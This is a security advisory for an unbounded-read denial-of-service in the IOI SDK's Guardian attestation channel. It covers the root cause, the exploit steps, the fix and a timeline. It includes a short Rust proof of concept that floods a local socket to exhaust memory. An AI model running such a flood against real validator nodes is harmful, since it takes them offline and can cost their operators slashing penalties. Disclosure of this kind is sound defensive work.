# IOI-SEC-2025-002 — Unbounded Memory Consumption in Guardian Attestation

**Date Published:** 2025-11-21  
**Severity:** High (CVSS 7.5)  
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  
**Status:** ✅ Patched  
**Fixed In:** Commit [`TBD`](https://github.com/ioi-network/ioi-sdk/commit/<tbd>)

---

## 1. Summary

A vulnerability was discovered in the internal mTLS protocol used between the `orchestration` container and the `guardian` container. The Guardian container utilized an unbounded read operation (`read_to_end`) when receiving attestation requests.

This allowed a malfunctioning or compromised Orchestrator—or an attacker with access to the internal validator network—to open a connection and stream an infinite amount of data, causing the Guardian process to exhaust available memory and crash (OOM). Since the Guardian holds the validator's attestation keys, this results in a total Denial of Service for the node.

---

## 2. Affected Components

| Layer | File(s) | Impact |
|-------|----------|--------|
| **Validator** | `crates/validator/src/standard/orchestration/mod.rs` | The Orchestrator receiver used unbounded reads. |
| **Node** | `crates/node/src/bin/guardian.rs` | The Guardian sender used a non-framed write protocol. |

---

## 3. Vulnerability Details

### Root Cause

The communication protocol for the agentic model attestation report relied on the end-of-stream (EOF) to determine message boundaries. The receiving side (Orchestrator) used `tokio::io::AsyncReadExt::read_to_end`, which reads bytes into a vector until the connection is closed.

There was no check on the size of the incoming data stream before allocation.

```rust
// Vulnerable pattern in crates/validator/src/standard/orchestration/mod.rs
let mut report_bytes = Vec::new();
// This reads until EOF, growing the vector indefinitely
stream.read_to_end(&mut report_bytes).await?; 
```

### Exploit Scenario

1.  An attacker gains control of the Orchestration container (via RCE or logic bug) OR gains access to the internal pod network.
2.  The attacker initiates a TLS connection to the Guardian (or vice versa, hijacking the established channel).
3.  The attacker sends a continuous stream of random bytes without ever closing the connection (sending EOF).
4.  The Guardian (or Orchestrator, depending on direction) continues to allocate memory to the buffer to accommodate the incoming stream.
5.  **Observed Behavior:** The target process hits the system memory limit and is killed by the OS OOM killer.
6.  **End Result:** The validator node goes offline and cannot restart or re-attest without manual intervention, potentially leading to slashing for downtime.

---

## 4. Proof-of-Concept

```rust
// Simulating a malicious peer flooding the stream
use tokio::net::TcpStream;
use tokio::io::AsyncWriteExt;

#[tokio::main]
async fn main() {
    // Assume mTLS handshake is completed or bypassed for PoC context
    let mut stream = TcpStream::connect("127.0.0.1:8443").await.unwrap();
    
    let payload = [0u8; 1024 * 1024]; // 1MB chunk
    loop {
        // endlessly write data
        if stream.write_all(&payload).await.is_err() {
            break;
        }
    }
}
```

---

## 5. Impact Assessment

| Vector        | Description                                   |
| ------------- | --------------------------------------------- |
| **Economic**  | **Medium**. Validator downtime can lead to missed rewards or liveness slashing penalties. |
| **Liveness**  | **High**. The Guardian is the root of trust; if it crashes, the node cannot participate in consensus. |
| **Integrity** | **Low**. This exploit causes a crash but does not leak keys or corrupt chain state.     |

---

## 6. Remediation

### Code Fix

1.  **Protocol Framing:** The protocol was updated to use a length-prefixed format. The sender writes a `u32` length, followed by the payload.
2.  **Bounded Allocation:** The receiver reads the `u32` length first, validates it against a hard limit (10 MiB), and then pre-allocates the exact buffer size.

   ```rust
   // Patched Receiver
   let len = stream.read_u32().await?;
   
   const MAX_REPORT_SIZE: u32 = 10 * 1024 * 1024; // 10 MiB limit
   if len > MAX_REPORT_SIZE {
       return Err(anyhow!("Report too large"));
   }

   let mut report_bytes = vec![0u8; len as usize];
   stream.read_exact(&mut report_bytes).await?;
   ```

### Patch Reference

* Commit: [`<commit-hash>`](https://github.com/ioi-network/ioi-sdk/commit/<commit-hash>)
* Modules: `ioi-node`, `ioi-validator`

---

## 7. Verification

| Verification Step | Result                          |
| ----------------- | ------------------------------- |
| Unit / E2E Tests  | ✅ Passed (Standard Attestation Flow) |
| Regression Check  | ✅ Large payloads (>10MB) are immediately rejected |
| Network Liveness  | ✅ Node remains stable under high traffic |

---

## 8. Timeline

| Date (UTC)   | Event                               |
| ------------ | ----------------------------------- |
| 2025-11-21 | Vulnerability discovered during security audit |
| 2025-11-21 | Root cause confirmed (unbounded read) |
| 2025-11-21 | Patch implemented (Length-prefixed protocol) |
| 2025-11-21 | Patch merged and advisory published |

---

## 9. Acknowledgements

Discovered by internal security review of the IOI SDK Validator architecture.

---

## 10. References

* [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)
* [Rust Tokio AsyncReadExt documentation](https://docs.rs/tokio/latest/tokio/io/trait.AsyncReadExt.html#method.read_to_end)

---

*Document version:* 1.0  
*Last updated:* 2025-11-21
```